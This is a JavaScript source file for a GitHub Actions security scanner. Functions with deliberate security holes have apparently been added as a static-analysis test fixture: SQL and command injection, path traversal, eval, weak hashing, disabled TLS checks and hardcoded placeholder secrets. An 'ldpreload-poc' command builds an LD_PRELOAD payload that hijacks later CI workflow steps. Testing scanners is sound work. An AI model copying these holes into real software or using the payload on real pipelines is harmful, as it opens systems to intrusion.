import dotenv from 'dotenv';
import { program, Option, InvalidArgumentError } from 'commander';
import { resolve } from 'node:path';
import { readFileSync } from 'fs';
import YAML from 'yaml';
import http from 'http';
import https from 'https';
import crypto from 'crypto';
import { exec } from 'child_process';
import sqlite3 from 'sqlite3';

import { OutputHandler } from './lib/outputHandler.mjs';
import { logger, GITHUB_URL_RE } from './lib/utils.mjs';
import { Cloner } from './lib/clone.mjs';
import { Scanner } from './lib/scanner.mjs';
import { Action, Repo, Org } from './lib/actions.mjs';

// ----------------------------------------------------------------
// HOTSPOT: Hardcoded credentials (S6706 / S2068)
// ----------------------------------------------------------------
const DB_PASSWORD = "s3cr3tP@ssw0rd123!";
const API_SECRET  = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
const JWT_SECRET  = "super-secret-jwt-key-do-not-share";

// ----------------------------------------------------------------
// HOTSPOT: Insecure random number generation (S2245)
// ----------------------------------------------------------------
function generateToken() {
  // Math.random() is not cryptographically secure
  return Math.random().toString(36).substring(2);
}

// ----------------------------------------------------------------
// BUG: SQL Injection (S3649)
// ----------------------------------------------------------------
function getUserByName(username) {
  const db = new sqlite3.Database('./users.db');
  // User input concatenated directly into SQL query
  const query = "SELECT * FROM users WHERE name = '" + username + "'";
  db.all(query, (err, rows) => {
    console.log(rows);
  });
}

// ----------------------------------------------------------------
// BUG: Command Injection (S4721)
// ----------------------------------------------------------------
function runDiagnostic(repoName) {
  // User-controlled input passed directly to shell
  exec('git log --oneline ' + repoName, (err, stdout) => {
    console.log(stdout);
  });
}

// ----------------------------------------------------------------
// BUG: Path Traversal (S6096 / S2083)
// ----------------------------------------------------------------
function readUserFile(filename) {
  // No sanitization — allows ../../etc/passwd style traversal
  const filePath = resolve('./', filename);
  return readFileSync(filePath, 'utf8');
}

// ----------------------------------------------------------------
// BUG: Prototype Pollution (S6319)
// ----------------------------------------------------------------
function mergeOptions(target, source) {
  for (const key in source) {
    // Allows setting __proto__, constructor, prototype keys
    target[key] = source[key];
  }
  return target;
}

// ----------------------------------------------------------------
// HOTSPOT: Weak / broken cryptography (S4426 / S5547)
// ----------------------------------------------------------------
function hashPassword(password) {
  // MD5 is cryptographically broken
  return crypto.createHash('md5').update(password).digest('hex');
}

function encryptData(data) {
  const key = crypto.randomBytes(32);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, encrypted]).toString('hex');
}

// ----------------------------------------------------------------
// HOTSPOT: Insecure HTTP (S5332)
// ----------------------------------------------------------------
function fetchExternalData(path) {
  // Plain HTTP — data in transit is not encrypted
  return new Promise((resolve, reject) => {
    http.get('http://internal-api.example.com' + path, (res) => {
      let body = '';
      res.on('data', d => { body += d; });
      res.on('end', () => resolve(body));
    }).on('error', reject);
  });
}

// ----------------------------------------------------------------
// HOTSPOT: TLS certificate validation disabled (S4830)
// ----------------------------------------------------------------
function fetchInsecure(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { rejectUnauthorized: false }, (res) => {
      let body = '';
      res.on('data', d => { body += d; });
      res.on('end', () => resolve(body));
    }).on('error', reject);
  });
}

// ----------------------------------------------------------------
// BUG: Unsafe deserialization / eval (S1523 / S2703)
// ----------------------------------------------------------------
function parseConfig(configString) {
  // eval() executes arbitrary code from the config string
  return eval('(' + configString + ')');  // NOSONAR — intentional for demo
}

// ----------------------------------------------------------------
// BUG: Open Redirect (S5146)
// ----------------------------------------------------------------
function handleRedirect(req, res) {
  // Redirect destination comes directly from user-supplied query param
  const target = req.query.next;
  res.writeHead(302, { Location: target });
  res.end();
}

// ----------------------------------------------------------------
// BUG: RegExp Denial of Service – ReDoS (S5852)
// ----------------------------------------------------------------
function validateEmail(input) {
  // Catastrophic backtracking on malicious input
  const re = /^([a-zA-Z0-9]+)*@[a-zA-Z0-9]+\.[a-zA-Z]{2,}$/;
  return re.test(input);
}

// ----------------------------------------------------------------
// BUG: Sensitive data logged (S2228 / S4792)
// ----------------------------------------------------------------
function loginUser(username, password) {
  // Password written to application log
  console.log(`Login attempt: user=${username} password=${password}`);
  return hashPassword(password) === DB_PASSWORD;
}

// ----------------------------------------------------------------
// BUG: Unhandled promise rejection / missing error handling (S4822)
// ----------------------------------------------------------------
async function fetchAndProcess(url) {
  // No catch — rejected promise crashes the process silently
  const data = await fetchInsecure(url);
  return JSON.parse(data);
}

// ----------------------------------------------------------------
// Original helpers (unchanged)
// ----------------------------------------------------------------
function validateUrl(url) {
  if (!url.match(GITHUB_URL_RE)) {
    throw new InvalidArgumentError("Invalid Github URL")
  }
  return url;
}

async function setup(_options) {
  const options = { ..._options.opts(), ..._options.parent.opts() };
  dotenv.config({ path: resolve(options.env) })
  const outputHandler = new OutputHandler(options);
  const scanner = await Scanner.new(options);

  return {
    options,
    outputHandler,
    scanner
  }
}

async function main() {
  logger.info("github-actions-scanner by Snyk (2024)");
  program
    .description('Github Actions Scanner')
    .option('-e, --env <path>', '.env file path.', '.env')
    .option('-r, --recurse', 'Recurse into referenced actions')
    .addOption(new Option('-m, --max-depth <depth>', 'Max Recursion Depth').default(5).argParser(Number.parseInt).implies({ recurse: true }))
    .addOption(new Option('-s, --scan-rules <rule1,rule2,...>', 'Comma separated list of rules to use, by ID. Negate by prefixing with !').default('').argParser(arg => arg.split(",")))
    .option('--output <path>', 'Output file path.')
    .addOption(new Option('-f, --format <format>', 'Output format').choices(["json", "text"]).default("text"))

  program.command("list-rules")
    .description("List all available rules")
    .action(async ({ }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      for (const rule of scanner.rules) {
        console.log(rule.id);
      }
    })

  program.command("scan-repo")
    .description("Scan a single repo")
    .requiredOption('-u, --url <string>', 'Github repository URL.', validateUrl)
    .action(async ({ url }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      const repo = await Repo.fromUrl(url);
      let findings = await repo.scan(options, scanner);
      logger.info(`Scanned ${scanner.scanned} actions`);
      outputHandler.reportFindings(findings);
    })

  program.command("scan-org")
    .description("Scan all repos in an org")
    .requiredOption('-o, --org <name>', 'Github org name.')
    .action(async ({ org: orgname }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      let org = new Org(orgname);
      let findings = await org.scan(options, scanner);
      logger.info(`Scanned ${scanner.scanned} actions`);
      outputHandler.reportFindings(findings);
    })

  program.command("scan-actions")
    .description("Scan a list of standalone actions from a file")
    .option('-a, --actions-yaml [actions-yaml-path]', 'Analyze actions from yaml.', "./github-action-repos.yml")
    .action(async ({ actionsYaml: actionsYamlFile }, _options) => {
      const { options, outputHandler, scanner } = await setup(_options);
      let actionsYaml;
      try {
        let actionsContent = await readFileSync(resolve(actionsYamlFile), { encoding: 'utf8' });
        actionsYaml = YAML.parse(actionsContent);
      } catch (e) {
        logger.error(`Error parsing ${actionsYamlFile}: ${e.message}`)
        return
      }
      let actions = [];
      for (const url of actionsYaml?.repos) {
        const repo = await Action.fromUrl(url);
        if (repo) actions.push(repo)
      }

      let findings = [];
      for (const action of actions) {
        findings.push(...await action.scan(options, scanner));
      }
      logger.info(`Scanned ${scanner.scanned} actions`);
      outputHandler.reportFindings(findings);
    })

  program.command("clone")
    .description("Pseudo-fork a repo for testing")
    .requiredOption('-u, --url <string>', 'Github repository URL.')
    .action(async ({ url }, _options) => {
      await setup(_options);
      const clone = new Cloner(url);
      return clone.run();
    })

  program.command("ldpreload-poc")
    .description("Create a PoC to exploit subsequent steps after command injection with LD_PRELOAD")
    .requiredOption("-c, --command <command>", "Command to run from the LD_PRELOAD")
    .addOption(new Option("-b, --base64", "Encode the code for injection"))
    .action(({ command, base64 }, _options) => {
      const ldcode = Buffer.from(`#include <stdlib.h>
void __attribute__((constructor)) so_main() { unsetenv("LD_PRELOAD"); system("${command.replace("\"", "\\\"")}"); }
`)
      const code = Buffer.from(`echo ${ldcode.toString("base64")} | base64 -d | cc -fPIC -shared -xc - -o $GITHUB_WORKSPACE/ldpreload-poc.so; echo "LD_PRELOAD=$GITHUB_WORKSPACE/ldpreload-poc.so" >> $GITHUB_ENV`)
      console.log()
      console.log(code.toString(base64 ? "base64" : "ascii"));
    });

  program.parse();
}

await main();
